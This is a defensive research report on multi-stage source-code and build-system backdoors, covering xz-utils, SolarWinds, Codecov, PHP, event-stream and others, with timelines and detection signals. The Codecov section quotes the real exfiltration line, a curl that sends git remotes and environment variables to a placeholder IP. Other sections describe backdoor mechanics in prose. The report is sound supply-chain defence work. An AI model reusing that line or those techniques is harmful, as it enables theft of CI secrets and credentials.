# Multi-stage source-code and build-system backdoors (2015 to Oct 2026)

Scope: staged or layered backdoors where each piece looks benign alone. Defensive structure and signals only. No payloads.

## xz-utils CVE-2024-3094: timeline, staging, and why diff review missed it

### Takeaway
The xz backdoor took 2.5 years to assemble. A persona built trust with harmless patches. Sock puppets pressured the maintainer into handing over control. Runtime groundwork (ifunc) landed a year early. Fuzzing coverage of that groundwork was switched off. The payload sat in "test" binaries that no test used. The trigger lived only in the release tarball's `build-to-host.m4`, never in git. No single git diff contained a reviewable backdoor. Only correlating blobs, a tarball-only build macro, CI/fuzzer config changes, sandbox weakening, and the change of maintainer exposes it.

### Cited Findings
**Persona and social engineering**
- 2021-10-29: "Jia Tan" sends a first harmless patch (.editorconfig). 2021-11-29: a reproducible-build fix. 2022-02-07: first merged commit under jiat0218@gmail.com — [Russ Cox, xz timeline](https://research.swtch.com/xz-timeline)
- 2022-04-22 onward: "Jigar Kumar" complains that Jia Tan's patches are not landing. 2022-05-19: "Dennis Ens" asks whether XZ for Java is maintained and later urges handing over maintainership. Repeated pressure emails run through 2022-06-22 — [Russ Cox](https://research.swtch.com/xz-timeline)
- 2022-06-29: Lasse Collin calls Jia Tan "practically a co-maintainer". 2022-10-28: Jia Tan joins the Tukaani GitHub org. 2022-11-30: the bug-report alias now reaches Jia Tan. 2022-12-30: Jia Tan merges directly. 2023-01-11: Collin's last release (5.4.1). 2023-03-18: Jia Tan tags 5.4.2 — [Russ Cox](https://research.swtch.com/xz-timeline)
- 2023-03-20: Jia Tan changes the oss-fuzz config so bugs are sent to him. 2024-01-19: the project website moves to GitHub Pages under his control — [Russ Cox](https://research.swtch.com/xz-timeline)
- SentinelOne says the pressure emails may have been orchestrated and the senders may not have existed. It assesses the actor as likely state-aligned — [SentinelOne](https://www.sentinelone.com/blog/xz-utils-backdoor-threat-actor-planned-to-inject-further-vulnerabilities/)

**Groundwork commits (each one plausible)**
- 2023-06-22: patches by a second persona, "Hans Jansen", add GNU ifunc for runtime CRC selection. This creates a hook that can modify function tables before they are remapped read-only — [Russ Cox](https://research.swtch.com/xz-timeline)
- 2023-07-07: Jia Tan disables ifunc in oss-fuzz builds, citing incompatibility with AddressSanitizer — [Russ Cox](https://research.swtch.com/xz-timeline)

**Payload staging**
- 2024-02-23: the backdoor is committed inside binary test inputs `tests/files/bad-3-corrupt_lzma2.xz` and `tests/files/good-large_compressed.lzma` (commits cf44e4b7…, 74b138d2…, later reverted in e93e13c8…) — [Russ Cox](https://research.swtch.com/xz-timeline); [thesamesam FAQ gist](https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27)
- Freund: "the files were not even used for any" tests in 5.6.0 — [Freund, oss-security](https://www.openwall.com/lists/oss-security/2024/03/29/4)
- Freund on the tarball-only trigger: "That line is not in the upstream source of build-to-host, nor is build-to-host used by xz in git." It runs an obfuscated script at the end of configure that decodes data from the test files and pipes the result to a shell — [Freund](https://www.openwall.com/lists/oss-security/2024/03/29/4)
- Structure of the m4 change: the serial number is bumped from 3 to 30. A `grep -aErls` over `$srcdir/` looks for a marker. A `tr` character-swap map (`gl_path_map`) is defined. An `AC_CONFIG_COMMANDS([build-to-host], ...)` evals a stored command through `$SHELL` — [thesamesam gist](https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27)
- Chain: m4 → stage-1 script extracted from bad-3-corrupt_lzma2.xz (via `tr` then `xz -d`) → stage-2 extracts a prebuilt object from good-large_compressed.lzma → linked into liblzma during compilation — [Kaspersky Securelist via search summary](https://securelist.com/xz-backdoor-story-part-1/112354/); [SentinelOne](https://www.sentinelone.com/blog/xz-utils-backdoor-threat-actor-planned-to-inject-further-vulnerabilities/)
- The injected object is named `liblzma_la-crc64-fast.o`. LWN notes the name provides plausible deniability — [LWN](https://lwn.net/SubscriberLink/967192/4dc234130d1cd9ee/) (via search snippet)
- Stage 2 in 5.6.1 is modular. It scans `tests/files/` for files with specific magic bytes and unpacks and runs embedded scripts in both the configure and make phases. That lets future backdoors arrive as new "test files" with no build-script change — [SentinelOne](https://www.sentinelone.com/blog/xz-utils-backdoor-threat-actor-planned-to-inject-further-vulnerabilities/)
- 5.6.0 to 5.6.1: an OS check is repeated five times, the `head` byte count changes from 724 to 939, and `tr` is adjusted to match — [SentinelOne](https://www.sentinelone.com/blog/xz-utils-backdoor-threat-actor-planned-to-inject-further-vulnerabilities/)

**Build and runtime gating**
- Build-time: x86-64 Linux, gcc plus GNU ld, and a Debian or RPM package build. Runtime: argv[0] is `/usr/sbin/sshd`, TERM is unset, LANG is set, LD_DEBUG and LD_PROFILE are unset, and some debuggers (rr, sometimes gdb) are detected — [Freund](https://www.openwall.com/lists/oss-security/2024/03/29/4)
- The ifunc resolvers `crc32_resolve`/`crc64_resolve` are replaced. An audit hook redirects `RSA_public_decrypt@plt`. The backdoor fails with LD_BIND_NOT=1 — [Freund](https://www.openwall.com/lists/oss-security/2024/03/29/4)

**Sandbox weakening**
- Commit 328c52da (dated 2024-02-26, "Build: Fix Linux Landlock feature test in Autotools and CMake builds") adds a single stray `.` in CMakeLists.txt. The landlock.h check always fails and Landlock is silently disabled unless explicitly enforced. Collin later reverted it as "CMake: Fix sabotaged Landlock sandbox check" — [oss-security 2024/03/30/8](https://openwall.com/lists/oss-security/2024/03/30/8) (via search summary); [thesamesam gist](https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27)
- Cox dates a related commit 2024-02-28. It broke landlock detection in the configure script through a syntax error in the test C program, with Collin listed as committer — [Russ Cox](https://research.swtch.com/xz-timeline). SentinelOne says the commit was attributed to Collin and may have been forged — [SentinelOne](https://www.sentinelone.com/blog/xz-utils-backdoor-threat-actor-planned-to-inject-further-vulnerabilities/). Conflict: sources disagree on the date (Feb 26 vs Feb 28) and on whether it was CMake, configure, or both. The commit title covers both.

**Pushing the release and covering errors**
- 2024-03-04: Red Hat sees Valgrind errors in `_get_cpuid`. 2024-03-08: Jia Tan commits a purported Valgrind fix, which Cox calls misdirection. 2024-03-09: updated backdoor test files (the actual fix) and the 5.6.1 release. 2024-03-25: "Hans Jansen" files a Debian bug asking for 5.6.1. 2024-03-28: Jia Tan files a similar Ubuntu bug — [Russ Cox](https://research.swtch.com/xz-timeline)
- 2024-02-29 to 03-05: a systemd PR to stop linking liblzma into libsystemd, which would have defeated the attack, is opened and merged. This may explain the rush — [Russ Cox](https://research.swtch.com/xz-timeline)
- Discovery: Freund noticed ssh logins taking more CPU (about 0.299s → 0.807s) plus valgrind errors. He traced them with `perf record -e intel_pt//ub` and gdb — [Freund](https://www.openwall.com/lists/oss-security/2024/03/29/4)

### Inferences
- Signals visible in a single diff, each weak alone: a binary file added under tests/ that no test references; an m4 macro serial jump (3→30); a one-character syntax change inside a feature-probe C snippet in CMake or configure; a CI/fuzzer config disabling a feature "for sanitizer compatibility"; contact addresses or security-report routing moved to a new person.
- Signals that only appear by correlation:
  1. Blob added (commit A) + later referenced by a build-time script (release tarball, or a later commit that greps `tests/files` or reads blobs by magic bytes). The detector must link "opaque file added" to "a build script reads opaque files and pipes them to a shell or `eval`."
  2. Release artifact ≠ git tree. Diff the tarball against `git archive` for the tag, especially autotools-generated files (m4, configure, Makefile.in).
  3. New runtime hook capability (ifunc, constructors, audit hooks) + coverage of that capability removed from fuzzing/sanitizer CI + security feature probe broken, all within a window by the same author or circle.
  4. Author trajectory: a new identity → steady low-risk patches → sock-puppet pressure on the incumbent → gains release/merge rights → changes security contacts and infra → first sensitive changes shortly before a release. Then a second identity pushes downstream adoption.
  5. A "fix" commit that touches only test binaries after a crash or valgrind report in the code that consumes nothing from those binaries.
- Why review missed it: the payload was opaque binary data under a "corrupt test file" pretext. The trigger was in generated release files nobody reviews against git. The sandbox break was one character inside a probe where failure is silent by design. The ifunc and oss-fuzz changes each had a legitimate rationale.

### Gaps
- I did not read the full Kaspersky, Akamai, Binarly, or Datadog write-ups. Stage-chain details come from search snippets and SentinelOne.
- The exact attribution and author/committer metadata of the landlock commit(s) is inconsistent across sources.

## SolarWinds Orion SUNBURST / SUNSPOT (2019–2020)

### Takeaway
The source repository was never modified. A build-host implant (SUNSPOT) swapped one source file only while MSBuild compiled Orion, then restored it. The signed output carried a dormant, heavily gated backdoor (SUNBURST). Repo review and diff tools see nothing. Detection needs build provenance (reproducible builds, comparing compiled artifacts to source) and build-host monitoring.

### Cited Findings
- SUNSPOT persists through a boot-time scheduled task, uses a mutex, and gets SeDebugPrivilege. Every second it polls for MsBuild.exe (by hashed process name) and reads its command line to spot the Orion solution — [CrowdStrike](https://www.crowdstrike.com/en-us/blog/sunspot-malware-technical-analysis/)
- It replaces InventoryManager.cs during the build. Before swapping, it MD5-checks both the original and the replacement and aborts on mismatch, so a build never breaks. It backs up the original, moves the modified file in, and restores the original when MSBuild exits — [CrowdStrike](https://www.crowdstrike.com/en-us/blog/sunspot-malware-technical-analysis/)
- The injected code is wrapped in `#pragma warning disable/restore` to suppress compiler warnings. Its entry point is a try/catch added to `RefreshInternal` that starts a background thread. Logs are RC4-encrypted and written to a file named like a VMware log. A second mutex lets operators stop it cleanly, avoiding broken builds that would expose it. SUNSPOT build timestamp: 2020-02-20 — [CrowdStrike](https://www.crowdstrike.com/en-us/blog/sunspot-malware-technical-analysis/)
- Insertion testing (empty classes) began as early as October 2019. The code went in before signing, so the DLL carried a valid signature — [Microsoft](https://www.microsoft.com/en-us/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/)
- SUNBURST stays dormant until the DLL's last-write time is 12–14 days old, with extra random waits. It requires the host process to be solarwinds.businesslayerhost.exe. It exits if analysis tools, security drivers, or security services are present (checked by hash). It rejects domains containing "solarwinds" or matching test-domain regexes, and checks that api.solarwinds.com resolves as expected. Its class name, `OrionImprovementBusinessLayer`, blends in. Strings are Base64-encoded or hashed — [Microsoft](https://www.microsoft.com/en-us/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/)

### Inferences
- Staging: (1) a dry-run insertion of empty classes in Oct 2019 tests whether the change survives to the signed release. (2) The real implant in Feb 2020. (3) Runtime dormancy plus environment gates keep it from firing in vendor test labs.
- Repo-level signals: none. Artifact-level signals: the compiled output contains a class or method absent from the source at that commit; `#pragma warning disable` around code nobody wrote; a new thread spawned from an existing refresh method.
- Pattern for source-level detectors (applies when such code is committed directly): comparisons against hashed constants (process, service, or domain names stored as hashes); date or elapsed-time arithmetic against file timestamps; "is this our own corp domain or a test domain" checks; DNS resolution checks against fixed IPs.

### Gaps
- I did not fetch the Mandiant/FireEye SUNBURST report for exact sizes or the full blocklist lists.

## Codecov Bash Uploader (2021)

### Takeaway
The repository was unchanged. The distributed script was edited at the distribution point (GCS) using a credential leaked from a Docker image build. The edit was one curl line exfiltrating env and git remotes, with `|| true` so it never broke CI.

### Cited Findings
- Periodic unauthorized edits began 2021-01-31, after a GCS key was extracted through "an error in Codecov's Docker image creation process". There were 108 windows of malicious exposure until 2021-04-01 — [Codecov](https://about.codecov.io/security-update/)
- The single change: a `curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" https://IP/upload/v2 || true`, exfiltrating CI credentials and the origin repo URL — [Codecov](https://about.codecov.io/security-update/)
- Detection: a customer compared the downloaded script's SHA against the checksum published on GitHub and found a mismatch — [Codecov](https://about.codecov.io/security-update/)

### Inferences
- Single-diff signals, if such a line ever appears in a repo: `env`/`printenv` piped to a network call; a raw IP URL; a short timeout plus `|| true` that suppresses failure.
- Correlation: the artifact served at the download URL ≠ the artifact at the tagged commit. A `curl | bash` consumer in CI with no checksum or pinned SHA is the precondition. The edits came and went over time (108 windows), so a one-time hash check would miss it. Continuous re-verification is needed.

### Gaps
- No public detail on who did it or the exact Docker image flaw.

## Hypocrite commits (University of Minnesota, 2020–2021) and bugdoors

### Takeaway
Researchers showed that small "fix" patches can introduce vulnerabilities, typically use-after-free from a misplaced free or unlock in an error path. A later review by the Linux Technical Advisory Board (TAB) found no malicious code merged from the re-reviewed UMN patches. The lesson for detection is that a bugdoor is a correct-looking patch whose danger only shows with knowledge of an object's lifetime across functions or files.

### Cited Findings
- Qiushi Wu and Kangjie Lu proposed "hypocrite commits": seemingly beneficial patches carrying use-after-free conditions. The paper was withdrawn in late April 2021. UMN was banned from kernel contributions — [PortSwigger](https://portswigger.net/daily-swig/Ill-advised-research-on-linux-kernel-lands-computer-scientists-in-hot-water); [LinuxSecurity on the TAB report](https://www.linuxsecurity.com/news/organizations-events/linux-s-technical-advisory-board-reports-on-the-umn-hypocrite-commits-patches)
- TAB report (2021-05-05): no malicious or bad-faith code was found in the re-reviewed UMN patches — [LinuxSecurity](https://www.linuxsecurity.com/news/organizations-events/linux-s-technical-advisory-board-reports-on-the-umn-hypocrite-commits-patches); [LKML thread](https://lkml.iu.edu/hypermail/linux/kernel/2105.1/00408.html)
- Lu's position (a party's claim): the three hypocrite patches were never intended to be merged and were not. The controversial bulk patches came from a separate project by Aditya Pakki — [Kangjie Lu](https://www-users.cse.umn.edu/~kjlu/misc)
- Juniper ScreenOS (disclosed Dec 2015) is a staged bugdoor in a commercial product. The Dual EC Q constant was replaced by the attacker. Comparing versions found a cluster of concurrent changes in a 2008 release, including flaws that kept Juniper's own countermeasure from ever running. Only together did they enable passive VPN decryption. A separate authentication-bypass backdoor was also present — [Checkoway et al., CCS 2016](https://eprint.iacr.org/2016/376); [CACM 2018](https://cacm.acm.org/magazines/2018/11/232227/fulltext)

### Inferences
- Single-diff signals: changes to cryptographic constants or parameters; error-path reordering (free/unlock/refcount-put moved before last use); a "cleanup" that deletes a bounds or length check.
- Correlation: Juniper shows the dangerous version is the combination of a parameter swap, a buffer-size change, and dead code in the countermeasure. A defender needs a "security-relevant constant changed" alert plus "the code path that should validate it is now unreachable."

### Gaps
- I did not retrieve the withdrawn IEEE S&P paper text, so the exact patch structures are not cited here.
- I found no strong academic measurement of bugdoor prevalence. The Trojan Source paper and the Ladisa taxonomy are the closest (below).

## PHP git server compromise (March 2021)

### Takeaway
An attacker with server-side push access forged commit authorship (Rasmus Lerdorf, Nikita Popov) and labelled a backdoor a "typo fix." When reverted, the attacker reverted the revert.

### Cited Findings
- 2021-03-28: two malicious commits were pushed to php-src under the names of Rasmus Lerdorf and Nikita Popov. The evidence pointed to a compromise of the git.php.net server, not of an individual account. The response: GitHub became canonical, and write access now required org membership with 2FA — [Nikita Popov, php.internals](https://news-web.php.net/php.internals/113838)
- The code ran PHP (`zend_eval_string`) from a `User-Agentt` header value starting with "zerodium." The commits were titled as typo fixes. After Popov's revert, the attacker reverted the revert. No PHP release contained it — [php.watch](https://php.watch/articles/git-php-net-hack); [The Hacker News](https://thehackernews.com/2021/03/phps-git-server-hacked-to-insert-secret.html?m=1)

### Inferences
- Signals: author identity vs pusher/committer mismatch, and no signature where the maintainer normally signs; a commit message ("fix typo") that does not match diff semantics (new eval sink plus a request-header source); a revert-of-revert by a different actor; pushes that skipped the usual review path.

## Other staged and dormant patterns

### Takeaway
Recurring shapes: (a) the payload as opaque data plus a separate decoder or trigger; (b) build or distribution infrastructure altered while the repo stays clean; (c) environment-keyed activation so the payload is inert everywhere but the target; (d) source that displays differently than it compiles.

### Cited Findings
- **event-stream / flatmap-stream (2018):** a new maintainer added the dependency flatmap-stream in event-stream 3.3.6. The payload was encrypted, and its key was derived from `npm_package_description`. Only Copay's description ("A Secure Bitcoin Wallet") decrypted it. Two stages ran at build time and a third inside the app. It went undetected for over two months — [Snyk post-mortem](https://snyk.io/de/blog/a-post-mortem-of-the-malicious-event-stream-backdoor); [The Hacker News](https://thehackernews.com/2018/11/nodejs-event-stream-module.html?hl=en_US)
- **Webmin (2018–2019, CVE-2019-15107):** the build server was compromised in April 2018, with a second change in July 2018. The tampered code went only to SourceForge downloads, not git. The file timestamp was set back so it did not show in diffs. The code survived a server rebuild because the build directory was restored from backup. Only 1.890 was exploitable by default — [Rapid7](https://www.rapid7.com/db/vulnerabilities/exploit/unix/webapp/webmin_backdoor/); [Packt summary of Cameron's post](https://hub.packtpub.com/a-year-old-webmin-backdoor-revealed-at-def-con-2019-allowed-unauthenticated-attackers-to-execute-commands-with-root-privileges-on-servers)
- **Ultralytics (Dec 2024):** a shell injection through a crafted branch name in a `pull_request_target` workflow (PRs #18018, #18020). The likely vector was a poisoned GitHub Actions cache, then a Trusted Publishing release. The PyPI artifacts (8.3.41, .42, .45, .46) contained a miner that is not in the GitHub source. The cache step is a strong inference, not confirmed — [PyPI blog](https://blog.pypi.org/posts/2024-12-11-ultralytics-attack-analysis/); [Yossarian](https://blog.yossarian.net/2024/12/06/zizmor-ultralytics-injection)
- **tj-actions/changed-files (Mar 2025, CVE-2025-30066):** existing mutable tags v1 through v45.0.7 were repointed to a malicious commit (0e58ed8) that dumped secrets into workflow logs. The action is used in over 23,000 repos. Listed in CISA KEV — [The Hacker News](https://thehackernews.com/2025/03/github-action-compromise-puts-cicd.html); [Orca](https://orca.security/resources/blog/github-action-tj-actions-changed-files-compromised/)
- **Trojan Source (Nov 2021, CVE-2021-42574):** Unicode bidi control characters make source render differently to reviewers than to compilers (Boucher and Anderson, Cambridge). gcc and clang added warnings, and GitLab flags them in diffs (secondary source) — [watchstack CVE entry](https://watchstack.io/intel/cve/CVE-2021-42574); [unicodefyi](https://unicodefyi.com/fr/glossary/bidi-attack/)
- **Taxonomy:** Ladisa et al. map 107 attack vectors to 94 real incidents and 33 safeguards. Venue is uncertain: arXiv 2204.04008, S&P'22 per one source. Follow-up in IEEE S&P magazine 2023 — [arXiv](https://arxiv.org/abs/2204.04008v2); [Journey to the Center…](https://arxiv.org/pdf/2304.05200)

### Inferences
Correlation logic a defensive tool needs (synthesized from the incidents above):
1. **Opaque-artifact lineage.** Track every binary, high-entropy, or minified/vendored file from the commit that adds it. Alert when a later change (any author) makes a build script, test harness, setup.py, build.rs, Gradle, CMake, or m4 read it and pipe it to a decoder (`tr`, `xxd`, `base64`, `xz -d`, `head -c`, `dd`), then to a shell, `eval`, `exec`, or the linker. xz did exactly this across commits and the tarball.
2. **Unused fixture.** A test data file that no test references at its commit is weak alone and strong with (1).
3. **Release ≠ source.** Diff tarballs, wheels, and npm tarballs against the tagged tree (xz, Webmin, Codecov, Ultralytics). Include generated autotools files. Flag tags that move (tj-actions).
4. **Capability assembly across files.** A source (env vars, request headers, file contents, package metadata) in one change, a transform (decode, decrypt, keyed by an env value) in another, a sink (shell, eval, network, linker) in a third. Each is benign alone (event-stream, PHP, Codecov).
5. **Gates.** New checks on hostname, domain, process name (argv[0]), CI-variable or package-name presence, elapsed time since a file timestamp, debugger or analysis-tool presence, TERM/LANG/LD_* variables, or comparison against hashed constants. These are environment-keyed activation (SUNBURST, xz, event-stream).
6. **Defense erosion near capability gain.** Sanitizer or fuzzer exclusions, a security feature probe broken (one-char syntax error in a `check_c_source_compiles` style test), `#pragma warning disable`, removed checksum verification. Weight these higher when the same actor recently added a runtime hook (ifunc, constructor, LD_AUDIT, init hooks).
7. **Identity and process anomalies.** Author vs committer/pusher mismatch, missing signatures, revert-of-revert, a commit message that doesn't match its semantics. A new contributor's rising privilege plus changes to security contacts or infra control. A second new identity lobbying downstream to adopt a release.
8. **Dead code activated later.** A function or class added with no callers (SUNBURST's Oct 2019 empty classes, xz ifunc), then a one-line change wiring it to a hot path.
9. **Invisible-text checks.** Bidi or zero-width characters in source and identifiers (Trojan Source).

### Gaps
- Time-bomb and geofence incidents in source repos from 2025–2026 beyond those listed were not researched within this budget. node-ipc (2022, geo-targeted protestware) is a known example, but I did not fetch a source for it.
- I found no reliable academic dataset quantifying how often staged attacks evade per-diff review. USENIX, CCS, and S&P detection papers on malicious commits were not retrieved.
- I did not fetch reviewdog's link to tj-actions (reported elsewhere as the upstream compromise), so it is uncited.
